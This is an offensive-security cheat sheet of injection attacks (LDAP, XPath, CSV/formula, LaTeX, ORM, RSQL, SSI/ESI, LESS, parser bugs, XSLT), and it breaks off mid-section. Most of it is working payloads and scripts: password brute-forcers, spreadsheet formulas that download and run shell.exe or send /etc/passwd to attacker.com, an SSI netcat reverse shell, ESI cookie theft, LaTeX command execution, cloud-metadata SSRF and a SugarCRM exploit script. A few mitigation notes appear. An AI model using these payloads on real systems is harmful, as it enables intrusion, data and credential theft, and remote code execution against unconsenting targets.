## ▶ Overview

**Injection vulnerabilities** occur when untrusted data is sent to an interpreter as part of a command or query. Attackers can inject malicious code/commands that trick the interpreter into executing unintended operations, potentially leading to data breaches, system compromise, or privilege escalation.

**Common types include:**

- **SQL Injection (SQLi)** – Manipulating database queries
- **LDAP Injection** – Exploiting directory service queries
- **XPath Injection** – Attacking XML data queries
- **Formula/CSV Injection** – Injecting formulas in spreadsheets
- **LaTeX Injection** – Exploiting LaTeX document processors
- **XSLT Injection** – Server-side template injection via XSLT
- **ORM Injection** – Abusing Object-Relational Mapping filters
- **RSQL Injection** – Exploiting REST API query languages
- **SSI/ESI Injection** – Server/Edge Side Include attacks
- **LESS Code Injection** – Abusing CSS preprocessors for SSRF/LFI
- **JSON/XML/YAML Parser Issues** – Format confusion & deserialization attacks
- **Null-Byte Injection** – Bypassing filters with `%00`
- **Phone Number Injections** – Exploiting phone fields for XSS/SQLi/SSRF
- **Arbitrary File Download** – IDOR/traversal leading to file disclosure

---

## 🎯 LDAP Injection

### Theory

**LDAP (Lightweight Directory Access Protocol)** queries constructed from user input without sanitization allow attackers to manipulate filters, bypass authentication, or extract sensitive directory data.

**Filter syntax:**

```
Filter = ( filtercomp )
Filtercomp = and / or / not / item
And = & filterlist
Or = | filterlist
Not = ! filter
Item = simple / present / substring
```

**Example filters:**

```
(&(!(objectClass=Impresoras))(uid=s*))
(&(objectClass=user)(uid=*))
```

### Exploitation Methods

#### Login Bypass

Inject payloads to authenticate without credentials:

```bash
# OR bypass (same value in user & password)
' or '1'='1
" or "1"="1
' or ''='
" or ""="

# Result: (&(user='' or '1'='1')(password='' or '1'='1'))
```

```bash
# Null byte injection
Username: ' or 1]%00
```

```bash
# Double OR in username
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '

# Result: (&(user='' or true() or '')(password=''))
```

```bash
# Select specific account
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
```

```bash
# Known username
admin' or '
admin' or '1'='2

# Result: (&(user='admin' or '1'='2')(password=''))
```

#### Data Extraction

When application reflects query results:

```bash
') or 1=1 or ('                                    # Get all names
') or 1=1] | //user/password[('')=('              # All names + passwords
') or 2=1] | //user/node()[('')=('                # All values
')] | //./node()[('')=('                          # All values
')] | //node()[('')=('                            # All values
')] | //password%00                               # Null byte abuse
')]/../*[3][text()!=(                             # All passwords
')] | //user/*[1] | a[('                          # All user IDs
')] | //user/*[2] | a[('                          # All usernames
')] | //user/*[3] | a[('                          # All passwords
')] | //user/*[4] | a[('                          # All accounts
```

### Blind LDAP Injection

#### Boolean-based detection

```bash
# True condition (returns data)
*)(objectClass=*))(&objectClass=void

# False condition (no data)
void)(objectClass=void))(&objectClass=void
```

#### Character-by-character extraction

```bash
(&(sn=administrator)(password=*))    # OK
(&(sn=administrator)(password=A*))   # KO
(&(sn=administrator)(password=M*))   # OK
(&(sn=administrator)(password=MA*))  # KO
# Continue bruteforcing...
```

### Automated Exploitation

**Script to discover valid LDAP attributes:**

```python
#!/usr/bin/python3
import requests
import string
import sys

proxy = {"http": "localhost:8080"}
url = "http://target.com/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "givenName", "mail", 
              "mobile", "name", "ou", "password", "sn", "uid", "username", 
              "userPassword"]

for attribute in attributes:
    value = ""
    finish = False
    while not finish:
        for char in alphabet:
            query = f"*)({attribute}={value}{char}*"
            data = {'login': query, 'password': 'bla'}
            r = requests.post(url, data=data, proxies=proxy)
            sys.stdout.write(f"\r{attribute}: {value}{char}")
            
            if "Cannot login" in r.text:
                value += str(char)
                break
            
            if char == alphabet[-1]:
                finish = True
                print()
```

**Blind exploitation (no wildcard):**

```python
#!/usr/bin/python3
import requests, string

alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
flag = ""

for i in range(50):
    print(f"[i] Looking for position {i}")
    for char in alphabet:
        r = requests.get(f"http://target.com/?search=admin*)(password={flag}{char}")
        if "TRUE_CONDITION" in r.text:
            flag += char
            print(f"[+] Flag: {flag}")
            break
```

### Google Dorks

```
intitle:"phpLDAPadmin" inurl:cmd.php
```

### Payloads

```bash
# Attribute wordlists
https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_attributes.txt
https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt
```

---

## 🎯 XPath Injection

### Theory

**XPath (XML Path Language)** is used to navigate XML documents. When user input is embedded in XPath queries without sanitization, attackers can manipulate queries to bypass authentication or extract data.

### Basic Syntax

**Node selection:**

- `nodename` – All nodes named "nodename"
- `/` – Select from root
- `//` – Select matching nodes anywhere
- `.` – Current node
- `..` – Parent node
- `@` – Attributes

**Examples:**

```xpath
bookstore                           # All "bookstore" nodes
/bookstore                          # Root "bookstore" element
bookstore/book                      # All "book" children of "bookstore"
//book                              # All "book" elements
bookstore//book                     # All "book" descendants of "bookstore"
//@lang                             # All "lang" attributes
```

**Predicates:**

```xpath
/bookstore/book[1]                  # First book
/bookstore/book[last()]             # Last book
/bookstore/book[last()-1]           # Second-to-last book
/bookstore/book[position()<3]       # First two books
//title[@lang]                      # Titles with "lang" attribute
//title[@lang='en']                 # Titles where lang="en"
/bookstore/book[price>35.00]        # Books with price > 35
```

**Wildcards:**

```xpath
/bookstore/*                        # All child elements of bookstore
//*                                 # All elements in document
//title[@*]                         # All titles with any attribute
```

### Exploitation Methods

#### Authentication Bypass

**Example query:**

```xpath
string(//user[name/text()='USER' and password/text()='PASS']/account/text())
```

**OR bypass (same value in user & password):**

```xpath
' or '1'='1
" or "1"="1
' or ''='
" or ""="

# Result: string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())
```

**Null injection:**

```xpath
Username: ' or 1]%00
```

**Double OR in username/password:**

```xpath
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '

# Select account with specific criteria
'or string-length(name(.))<10 or'           # Account with name length < 10
'or contains(name,'adm') or'                # First account with "adm" in name
'or contains(.,'adm') or'                   # Account with "adm" in current value
'or position()=2 or'                        # 2nd account

# Known username
admin' or '
admin' or '1'='2
```

#### Data Extraction

**Access information:**

```xpath
# All names
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

# All values
//user/node()
//user/child::node()

# Positions
//user[position()=1]/name                              # First user's name (pepe)
//user[last()-1]/name                                  # Second-to-last user (mark)
//user[position()=1]/child::node()[position()=2]       # First user's password (peponcio)

# Functions
count(//user/node())                                   # Count all values
string-length(//user[position()=1]/child::node()[position()=1])  # Length of "pepe" = 4
substring(//user[position()=2]/child::node()[position()=1],2,1)  # Substring "mark" → "a"
```

#### Schema Discovery

```python
# Discover structure
and count(/*) = 1                                      # root exists
and count(/*[1]/*) = 2                                 # root has 2 children
and count(/*[1]/*[1]/*) = 1                           # first child has 1 child
and count(/*[1]/*[1]/*[1]/*) = 0                      # no more children
and count(/*[1]/*[2]/*) = 3                           # second child has 3 children

# Confirm tag names
and name(/*[1]) = "root"
and substring(name(/*[1]/*[1]),1,1) = "a"             # First char = "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105  # Codepoint 105 = "i"

# OOB data exfiltration
doc(concat("http://attacker.com/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://attacker.com/", name(/*[1]/*[1])))
```

### Blind Exploitation

**Boolean-based extraction:**

```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''='
# True if length = 4

' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''='
# True if first char = "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(97)
# Check if 2nd char of username = "a" (ASCII 97)

# Error-based
... and ( if ( $employee/role = 2 ) then error() else 0 )...
# Triggers error if condition is true
```

**Python bruteforce script:**

```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"

# Find length
for i in range(30):
    r = requests.get(f"http://target.com?action=user&userid=2 and string-length(password)={i}")
    if "TRUE_COND" in r.text:
        l = i
        break
print(f"[+] Password length: {l}")

# Extract password
for i in range(1, l + 1):
    for al in alphabet:
        r = requests.get(f"http://target.com?action=user&userid=2 and substring(password,{i},1)={al}")
        if "TRUE_COND" in r.text:
            flag += al
            print(f"[+] Flag: {flag}")
            break
```

**Read file:**

```xpath
(substring((doc('file:///etc/passwd')/*[1]/*[1]/text()[1]),3,1))) < 127
```

### OOB Exploitation

```xpath
doc(concat("http://attacker.com/", RESULTS))
doc(concat("http://attacker.com/", /Employees/Employee[1]/username))
doc(concat("http://attacker.com/", encode-for-uri(/Employees/Employee[1]/username)))

# Alternative: doc-available (returns true/false)
doc-available(concat("http://attacker.com/", RESULTS))
not(doc-available(...))  # Invert result
```

### Automated Tools

- [xcat](https://xcat.readthedocs.io/)
- [xxxpwn](https://github.com/feakk/xxxpwn)
- [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart)
- [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
- [XmlChor](https://github.com/Harshal35/XMLCHOR)

---

## 🎯 Formula/CSV/Doc/LaTeX/GhostScript Injection

### CSV/Formula Injection

#### Theory

If user input is reflected in **CSV files** opened by Excel/LibreOffice, attackers can inject formulas that execute when the file is opened or links are clicked.

⚠️ **Modern Excel alerts users multiple times before loading external content.**

#### Payloads

**DDE (Dynamic Data Exchange) – Excel:**

```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget http://attacker.com/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```

**Hyperlink-based exfiltration:**

```
=HYPERLINK("http://attacker.com/?data="&A1,"Click here")
```

**Example attack flow:**

1. Attacker submits: `=HYPERLINK("http://attacker.com/?steal="&B2,"Click")`
2. Teacher exports CSV
3. Teacher opens CSV, clicks link
4. Sensitive data from cell B2 is sent to attacker's server

**RCE via DDE (requires settings enabled):**

```
=cmd|' /C calc'!xxx
=cmd|' /C powershell Invoke-WebRequest "http://attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```

#### LibreOffice Calc – LFI

**Read local files:**

```
='file:///etc/passwd'#$passwd.A1
```

**Exfiltrate via WEBSERVICE:**

```
=WEBSERVICE(CONCATENATE("http://attacker.com/",('file:///etc/passwd'#$passwd.A1)))
=WEBSERVICE(CONCATENATE("http://attacker.com/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))
```

**DNS exfiltration:**

```
=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<attacker-domain>"))
```

#### Google Sheets – OOB Exfiltration

```
=CONCATENATE(A2:E2)
=IMPORTXML(CONCAT("http://attacker.com/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
=IMPORTFEED(CONCAT("http://attacker.com/123.txt?v=", CONCATENATE(A2:E2)))
=IMPORTHTML(CONCAT("http://attacker.com/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[SheetId]", "sheet1!A2:E2")
=IMAGE("https://attacker.com/image.png")
```

### LaTeX Injection

#### Theory

LaTeX processors like **`pdflatex`** can be exploited to read files, write files, or execute commands depending on configuration:

- `--no-shell-escape` – Disable `\write18{command}`
- `--shell-restricted` – Allow only safe commands
- `--shell-escape` – Enable arbitrary command execution ⚠️

**Always use `--shell-restricted` to prevent RCE.**

#### Read File

```latex
\input{/etc/passwd}
\include{password}                      % Load .tex file
\lstinputlisting{/etc/passwd}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

**Single-line file:**

```latex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

**Multi-line file:**

```latex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

#### Write File

```latex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```

#### Command Execution

```latex
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# Allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# Alternative commands
\input{|"bibtex8 --version > /tmp/b.tex"}
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```

**Bypass bad characters with base64:**

```latex
\immediate\write18{env | base64 > test.tex}
\input{test.tex}
```

#### XSS

```latex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

### GhostScript Injection

Check: [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

---

## 🎯 ORM Injection

### Django ORM (Python)

#### Theory

When Django **filters are directly passed user input** (e.g., `Article.objects.filter(**request.data)`), attackers can inject unexpected filters to leak data or bypass restrictions.

#### Exploitation Methods

**Login – Leak passwords:**

```json
{
  "username": "admin",
  "password__startswith": "a"
}
```

Brute-force character-by-character to extract password.

**Relational filtering:**

```json
{
  "created_by__user__password__contains": "pass"
}
```

Traverse relationships: `Article` → `Author` → `User` → `password`

**Many-to-many filtering:**

```json
{
  "created_by__departments__employees__user__startswith": "admi"
}
```

Access users in same department/group.

**Django default relationships (Groups/Permissions):**

```
created_by__user__groups__user__password
created_by__user__user_permissions__user__password
```

**Bypass filter restrictions:**

```python
# Even if is_secret=False is enforced:
Article.objects.filter(is_secret=False, categories__articles__id=2)
# Leak secret articles by looping back through relationships
```

**Error/Time-based via ReDoS:**

```json
{
    "created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"
}
```

Causes excessive backtracking if password matches.

**Database support:**

- **SQLite** – No regex by default
- **PostgreSQL** – No timeout, less prone to ReDoS
- **MariaDB** – No regex timeout

### Prisma ORM (NodeJS)

#### Full `findMany` Control

```javascript
app.post('/articles/verybad', async (req, res) => {
    const posts = await prisma.article.findMany(req.body.filter)
    res.json(posts);
});
```

**Leak user passwords:**

```json
{
    "filter": {
        "include": {
            "createdBy": true
        }
    }
}
```

**Select specific fields:**

```json
{
    "filter": {
        "select": {
            "createdBy": {
                "select": {
                    "password": true
                }
            }
        }
    }
}
```

#### Full `where` Clause Control

```javascript
app.get('/articles', async (req, res) => {
    const posts = await prisma.article.findMany({
        where: req.query.filter
    })
    res.json(posts);
});
```

**Filter by password:**

```javascript
{
  "createdBy": {
    "password": {
      "startsWith": "pas"
    }
  }
}
```

#### Bypass Filtering via Many-to-Many Loop

```json
{
  "query": {
    "categories": {
      "some": {
        "articles": {
          "some": {
            "published": false,
            "title": {
              "startsWith": "secret"
            }
          }
        }
      }
    }
  }
}
```

**Leak all users via nested relationships:**

```json
{
  "query": {
    "createdBy": {
      "departments": {
        "some": {
          "employees": {
            "some": {
              "email": {
                "startsWith": "admin"
              }
            }
          }
        }
      }
    }
  }
}
```

#### Time-Based Blind Injection

```json
{
    "OR": [
        {"NOT": {ORM_LEAK}},
        {CONTAINS_LIST}  // Array of 1000 strings to delay response
    ]
}
```

### Ransack (Ruby)

⚠️ **Ransack 4.0.0+ requires explicit allow lists.**

**Brute-force reset token:**

```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
```

**Exploit relationships:**

```http
GET /posts?q[user_email_cont]=admin
```

---

## 🎯 RSQL Injection

### Theory

**RSQL (RESTful Service Query Language)** is used for filtering in REST APIs. Similar to SQLi/LDAP injection, unsanitized RSQL filters allow data leakage, privilege escalation, and IDOR.

### Supported Operators

|Operator|Description|Example|
|---|---|---|
|`;` / `and`|Logical AND|`/api/users?q=name==admin;role==user`|
|`,` / `or`|Logical OR|`/api/users?q=name==admin,name==root`|
|`==`|Equals|`/api/users?q=email==admin@test.com`|
|`=q=`|Contains|`/api/users?q=name=q=adm`|
|`=like=`|Like|`/api/users?q=name=like=adm*`|
|`=in=`|In|`/api/users?q=role=in=(admin,moderator)`|
|`=out=`|Not in|`/api/users?q=role=out=(guest,banned)`|
|`!=`|Not equals|`/api/users?q=status!=inactive`|
|`<` / `=lt=`|Less than|`/api/products?q=price<100`|
|`>` / `=gt=`|Greater than|`/api/products?q=price>50`|
|`=rng=`|Range|`/api/orders?q=date=rng=(2024-01-01,2024-12-31)`|

### Common Filters & Parameters

**Filters:**

```
filter[users]=id=='123'
filter[status]=active
filter[date]=gte:2024-01-01
filter[category]=electronics
```

**Parameters:**

```
include=user,role
sort=-created_at
page[size]=10
page[number]=2
fields[users]=id,name,email
search=admin
```

### Exploitation Methods

#### Information Leakage & User Enumeration

**Normal endpoint:**

```http
GET /api/registrations?email=test@test.com
```

**RSQL injection:**

```http
GET /api/registrations?filter[userAccounts]=email=='test@test.com'
```

**Response if user exists:**

```json
{
    "data": {
        "id": "abc123",
        "type": "UserAccountDTO",
        "attributes": {
            "email": "admin@domain.local",
            "status": "ACTIVE"
        }
    }
}
```

#### Authorization Bypass

**Restricted endpoint (403 Forbidden):**

```http
GET /api/users
```

**Bypass with RSQL filter:**

```http
GET /api/users?filter[users]=id=in=(*a*)
```

**Response:**

```json
{
    "data": [{
        "id": "user123",
        "email": "admin@domain.local",
        "firstName": "admin",
        "password": "hashed_password"
    }]
}
```

#### Privilege Escalation

**Enumerate admin users:**

```http
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='admin-id-here'
```

**Response:**

```json
{
    "data": [{
        "userRole": {
            "userRoleId": 1,
            "userRoleKey": "general.roles.admin"
        }
    }]
}
```

**Escalate privileges:**

```http
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='admin-id-here'
```

Now requests will execute with admin privileges.

#### IDOR / Impersonation

**Access another user's profile:**

```http
GET /api/users?include=language,country&filter[users]=id=='victim-user-id'
```

**Response:**

```json
{
    "data": [{
        "email": "victim@domain.local",
        "firstName": "Victim",
        "mobilePhone": "123456789"
    }]
}
```

### Payloads

```
filter[users]=id=in=(*a*)
filter[users]=email=like=admin*
filter[companyUsers]=user.id=='<target-user-id>'
filter[userAccounts]=status==ACTIVE;email=q=admin
```

---

## 🎯 SSI/ESI Injection

### Server Side Includes (SSI)

#### Theory

SSI directives are placed in HTML pages and **evaluated on the server** during page serving. Files typically use `.shtml`, `.shtm`, or `.stm` extensions.

**Format:**

```html
<!--#directive param="value" -->
```

#### Exploitation

**Basic detection:**

```html
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DATE_LOCAL" -->
```

**File inclusion:**

```html
<!--#include virtual="/index.html" -->
<!--#include file="file_to_include.html" -->
<!--#include virtual="/cgi-bin/counter.pl" -->
```

**Command execution:**

```html
<!--#exec cmd="dir" -->
<!--#exec cmd="ls" -->
<!--#exec cmd="whoami" -->
```

**Reverse shell:**

```html
<!--#exec cmd="mkfifo /tmp/foo;nc <ATTACKER_IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

**Print environment:**

```html
<!--#printenv -->
```

**Set variables:**

```html
<!--#set var="name" value="Rich" -->
```

### Edge Side Includes (ESI)

#### Theory

ESI is used by **CDNs/proxies** to cache dynamic content. The `@import` directive fetches and inlines resources during compilation. Attackers can inject ESI tags to force SSRF, LFI, or XSS.

**Detection header:**

```
Surrogate-Control: content="ESI/1.0"
```

**Blind detection:**

```html
<esi:include src=http://attacker.com>
```

#### Exploitation

**XSS:**

```html
<esi:include src=http://attacker.com/xss.html>
```

**Bypass XSS filters:**

```html
<esi:assign name="var1" value="'cript'"/>
<s<esi:vars name="$(var1)"/>>alert(/XSS/)</s<esi:vars name="$(var1)"/>>

<!-- WAF bypass -->
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```

**Cookie theft (HTTP-only bypass):**

```html
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?c=$(HTTP_COOKIE{'JSESSIONID'})" />

<!-- Reflect in response -->
<!--esi $(HTTP_COOKIE) -->
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->
```

**Local file inclusion:**

```html
<esi:include src="secret.txt">
```

**CRLF injection:**

```html
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a"/>
```

**Open redirect:**

```bash
<!--esi $add_header('Location','http://attacker.com') -->
```

**Add header:**

```html
<esi:include src="http://example.
<esi:include src="http://example.com/test">
<esi:request_header name="User-Agent" value="Injected-Header"/>
</esi:include>

<!-- Bypass Content-Type restrictions -->
<!--esi/$add_header('Content-Type','text/html')/-->
<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->
```

**CRLF in headers (CVE-2019-2438):**

```html
<esi:include src="http://example.com/test">
<esi:request_header name="User-Agent" value="12345
Host: evil.com"/>
</esi:include>
```

**Akamai debug:**

```html
<esi:debug/>
```

#### ESI + XSLT = XXE

```html
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```

**poc.xsl:**

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://attacker.com/file" >]>
<foo>&xxe;</foo>
```

#### ESI Implementation Support

|Software|Includes|Vars|Cookies|Upstream Headers Required|Host Allowlist|
|---|---|---|---|---|---|
|Squid3|Yes|Yes|Yes|Yes|No|
|Varnish Cache|Yes|No|No|Yes|Yes|
|Fastly|Yes|No|No|No|Yes|
|Akamai ETS|Yes|Yes|Yes|No|No|
|NodeJS esi|Yes|Yes|Yes|No|No|
|NodeJS nodesi|Yes|No|No|No|Optional|

---

## 🎯 LESS Code Injection (SSRF & LFI)

### Theory

**LESS** is a CSS preprocessor that supports `@import (inline)` directives. During compilation, the LESS engine fetches and embeds referenced resources. When user input is concatenated into LESS code, attackers can inject arbitrary imports.

**Affected products:** SugarCRM ≤ 14.0.0

### Exploitation

**Basic injection:**

```less
1; @import (inline) 'file:///etc/passwd';
@import (inline) 'data:text/plain,@@END@@'; //
```

**SSRF – Cloud metadata:**

```less
1; @import (inline) "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
@import (inline) 'data:text/plain,@@END@@'; //
```

**Automated PoC:**

```bash
#!/usr/bin/env bash
# Usage: ./exploit.sh http://target/sugarcrm/ /etc/passwd

TARGET="$1"
RESOURCE="$2"

INJ=$(python -c "import urllib.parse,sys;print(urllib.parse.quote_plus(\"1; @import (inline) '$RESOURCE'; @import (inline) 'data:text/plain,@@END@@';//\"))")

curl -sk "${TARGET}rest/v10/css/preview?baseUrl=1&lm=${INJ}" | \
  sed -n 's/.*@@END@@\(.*\)/\1/p'
```

### Mitigations

- **Never** pass untrusted input to LESS compiler
- Sanitize/escape dynamic values
- Disable `(inline)` imports or restrict protocols to `https`
- Update to patched versions (SugarCRM 13.0.4+, 14.0.1+)

---

## 🎯 JSON, XML & YAML Injection/Parser Issues

### Go JSON Decoder Issues

These vulnerabilities were documented in [Trail of Bits blog](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/).

#### (Un)Marshaling Unexpected Data

**Vulnerable struct (missing tag = field is parsed):**

```go
type User struct {
    Username string  // No tag = still parsed!
}
```

**Payload:**

```json
{"Username": "admin"}
```

**Incorrect use of `-`:**

```go
type User struct {
    IsAdmin bool `json:"-,omitempty"`  // ❌ Wrong! Accepts "-" as key
}
```

**Payload:**

```json
{"-": true}
```

**✅ Correct way:**

```go
type User struct {
    IsAdmin bool `json:"-"`  // Blocks marshaling entirely
}
```

#### Parser Differentials

**Duplicate fields (Go takes LAST, Java takes FIRST):**

```json
{"action": "UserAction", "action": "AdminAction"}
```

- **Go:** `AdminAction`
- **Java/Python:** `UserAction`

**Case insensitivity (Go is case-insensitive):**

```json
{"AcTiOn": "AdminAction"}
```

Matches `Action` field in Go.

**Unicode tricks:**

```json
{"aKtionſ": "bypass"}
```

Go may still match `action`.

**Cross-service attack:**

1. Proxy (Go) sees: `{"action": "UserAction", "AcTiOn": "AdminAction"}`
2. Python sees `UserAction`, allows it
3. Go sees `AdminAction`, executes it

#### Data Format Confusion (Polyglots)

**CVE-2020-16250 (HashiCorp Vault):**

```json
{
  "action": "Action_1",
  "AcTiOn": "Action_2",
  "ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```

**Result:**

- **JSON parser:** `Action_2`
- **YAML parser:** `Action_1`
- **XML parser:** `Action_3`

### Notable Parser Vulnerabilities (2023-2025)

#### SnakeYAML Deserialization RCE (CVE-2022-1471)

**Affected:** `org.yaml:snakeyaml` < 2.0

**PoC (opens calculator):**

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com/"]]]]
```

**Fix:**

- Upgrade to ≥ 2.0 (uses `SafeLoader` by default)
- On older versions: `new Yaml(new SafeConstructor())`

#### libyaml Double-Free (CVE-2024-35325)

**Affected:** `libyaml` ≤ 0.2.5

**Issue:** Calling `yaml_event_delete()` twice causes double-free → DoS/heap exploitation

**Fix:** Upgrade to 0.2.6

#### RapidJSON Integer Overflow (CVE-2024-38517/CVE-2024-39684)

**Affected:** RapidJSON < 1.1.0-patch-22 (commit `8269bc2`)

**Issue:** `GenericReader::ParseNumber()` unchecked arithmetic → heap corruption → privilege escalation

**Fix:** Compile against latest RapidJSON (≥ July 2024)

### Mitigations

|Risk|Fix|
|---|---|
|Unknown fields (JSON)|`decoder.DisallowUnknownFields()`|
|Duplicate fields (JSON)|❌ No stdlib fix – validate with `jsoncheck`|
|Case-insensitive match|❌ No fix – pre-canonicalize input|
|XML garbage/XXE|Use hardened parser + `DisallowDTD`|
|YAML unknown keys|`yaml.KnownFields(true)`|
|Unsafe YAML deserialization|SafeConstructor / SnakeYAML ≥ 2.0|
|libyaml double-free|Upgrade to 0.2.6|
|RapidJSON overflow|Latest RapidJSON (≥ July 2024)|

---

## 🎯 XSLT Server Side Injection

### Theory

**XSLT (Extensible Stylesheet Language Transformations)** transforms XML documents. Versions 1, 2, and 3 exist (v1 most common). Transformation occurs on server or browser.

**Common frameworks:**

- **Libxslt** (Gnome)
- **Xalan** (Apache)
- **Saxon** (Saxonica)

### Tutorial Example

**Install Saxon:**

```bash
sudo apt-get install default-jdk libsaxonb-java libsaxon-java
```

**xml.xml:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
    <cd>
        <title>CD Title</title>
        <artist>The artist</artist>
        <price>10000</price>
    </cd>
</catalog>
```

**xsl.xsl:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
    <html><body>
    <h2>The Super title</h2>
    <table border="1">
        <tr><td><xsl:value-of select="catalog/cd/title"/></td></tr>
    </table>
    </body></html>
</xsl:template>
</xsl:stylesheet>
```

**Execute:**

```bash
saxonb-xslt -xsl:xsl.xsl xml.xml
```

### Fingerprinting

**detection.xsl:**

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>
```

### Exploitation

#### Read Files

**Internal (unparsed-text):**

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```

**XXE-based:**

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```

**Via document() function:**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

**PHP file_get_contents:**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

#### Directory Listing (PHP)

**opendir + readdir:**

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
